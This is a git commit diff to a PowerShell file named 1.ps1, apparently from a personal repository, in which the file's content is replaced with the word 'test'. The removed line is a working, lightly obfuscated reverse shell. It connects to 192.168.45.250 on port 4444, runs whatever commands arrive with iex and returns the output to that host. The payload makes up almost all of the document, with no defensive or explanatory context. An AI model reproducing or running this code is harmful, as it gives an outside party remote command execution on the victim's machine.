030fa2d555a367f871e55097150bdece8897ebe7
blackito404 <118223752+blackito404@users.noreply.github.com>
2024-01-10 14:44:17 +0200

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,5 +1,3 @@
-$RnDoMM = New-Object Net.Sockets.TCPClient('192.168.45.250',4444);$cevalung = $RnDoMM.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $cevalung.Read($bytes, 0, $bytes.Length)) -ne 0){;$nothingtoseehere = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$dbackhere = (iex $nothingtoseehere 2>&1 | Out-String );$dbackhere2  = $dbackhere + '> ';$back2back = ([text.encoding]::ASCII).GetBytes($dbackhere2);$cevalung.Write($back2back,0,$back2back.Length);$cevalung.Flush()};$RnDoMM.Close()
-  
-
+test  
     
     
